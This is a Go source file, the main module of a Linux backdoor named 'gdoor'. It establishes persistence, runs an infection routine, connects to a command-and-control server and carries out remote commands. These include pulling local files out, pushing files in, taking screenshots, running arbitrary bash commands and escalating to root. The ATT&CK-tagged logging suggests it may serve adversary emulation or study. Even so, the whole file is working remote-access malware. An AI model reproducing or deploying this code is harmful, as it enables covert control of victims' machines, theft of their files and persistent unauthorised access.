package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"gdoor/config"
	"gdoor/debug"
	"gdoor/infect"
	"gdoor/info"
	"gdoor/persist"
	"gdoor/privilege"
	"gdoor/screenshot"
	"gdoor/socket"
)

func main() {
	// get file info
	i, err := info.Init()
	if err != nil {
		debug.Println(err)
		return
	}

	// persistence
	persist.CheckAndExec(i)

	// infection
	infect.Infect(i)

	// C2
	token, sock := connect(fmt.Sprintf(":%s", i.GetCurUser()))
	handleCMD(token, sock, i)
}

// id: TOKEN:USER
func connect(id string) (string, socket.Socket) {
	var conn net.Conn
	var err error
	var sock socket.Socket
	for true {
		conn, err = net.Dial("tcp", config.ServerIP+config.ServerPort)
		if err == nil {
			sock, err = socket.Init(conn, config.Key, true)
			if err == nil {
				break
			}
		}
		debug.Println(err)
		time.Sleep(10 * time.Second)
	}

	sock.Write([]byte(id))
	token, _ := sock.Read()

	debug.Log("T1071", string(token), "", "Standard Application Layer Protocol")

	return string(token), sock
}

func handleCMD(token string, sock socket.Socket, i *info.Info) {
	for {
		cmdB, err := sock.Read()
		if err == io.EOF { // if socket break accidentally (reconnect)
			sock.Close()
			token, sock = connect(fmt.Sprintf("%s:%s", token, i.GetCurUser()))
		}

		cmd := string(cmdB)
		switch strings.Split(cmd, " ")[0] {
		case "ping":
			sock.Write([]byte("pong"))

		case "":
			continue

		case "push":
			debug.Log("T1105", token, cmd, "Remote File Copy")
			cmds := strings.Split(cmd, "push")
			cmds[1] = strings.TrimSpace(cmds[1])

			ftoken, fconn := connect(fmt.Sprintf(":%s", i.GetCurUser()))
			sock.Write([]byte(ftoken))
			if err = fconn.RecvFile(cmds[1]); err != nil {
				sock.Write([]byte(fmt.Sprintf("%v", err)))
			} else {
				sock.Write([]byte("Finished."))
			}
			fconn.Close()

		case "pull":
			debug.Log("T1105", token, cmd, "Remote File Copy")
			debug.Log("T1005", token, cmd, "Data from Local System")
			cmds := strings.Split(cmd, "pull")
			cmds[1] = strings.TrimSpace(cmds[1])

			ftoken, fconn := connect(fmt.Sprintf(":%s", i.GetCurUser()))
			sock.Write([]byte(ftoken))
			if err = fconn.SendFile(cmds[1]); err != nil {
				sock.Write([]byte(fmt.Sprintf("%v", err)))
			} else {
				sock.Write([]byte("Finished."))
			}
			fconn.Close()

		case "screenshot":
			debug.Log("T1113", token, cmd, "Screen Capture")
			if fileName, err := screenshot.TakeScreenShot(); err != nil {
				sock.Write([]byte(fmt.Sprintf("%v", err)))
			} else {
				sock.Write([]byte(fmt.Sprintln(fileName)))
			}

		case "cd":
			cmds := strings.Split(cmd, "cd")
			cmds[1] = strings.TrimSpace(cmds[1])
			if cmds[1] == "" {
				sock.Write([]byte("Insufficient argument."))
			} else {
				err = os.Chdir(cmds[1])
				if err != nil {
					debug.Println(err)
					sock.Write([]byte(fmt.Sprintf("Error: %v", err)))
				} else {
					sock.Write([]byte("Switch to " + cmds[1]))
				}
			}

		case "shell":
			shellCmdId, shellCmdText := debug.ShellCmdLog(cmd)
			debug.Log(shellCmdId, token, cmd, shellCmdText)
			cmds := strings.Split(cmd, "shell")
			cmds[1] = strings.TrimSpace(cmds[1])
			if cmds[1] == "" {
				sock.Write([]byte("Insufficent argument."))
			} else {
				output, err := exec.Command("/bin/bash", "-c", cmds[1]).CombinedOutput()
				if err != nil {
					debug.Println(err)
					sock.Write([]byte(fmt.Sprintf("Error: %v", err)))
				} else {
					sock.Write(output)
				}
			}

		case "root":
			debug.Log("T1105", token, cmd, "Remote File Copy")
			debug.Log("T1514", token, cmd, "Elevated Execution with Prompt")
			if i.GetCurUser() == "root" {
				sock.Write([]byte("Already root."))
			} else {
				result, err := privilege.Get()
				if err != nil {
					debug.Println(err)
					sock.Write([]byte(fmt.Sprintf("Error: %v", err)))
				} else {
					sock.Write([]byte(result))
				}
			}

		case "shutdown":
			sock.Close()
			return

		default:
			sock.Write([]byte("No such command."))

		}
	}
}
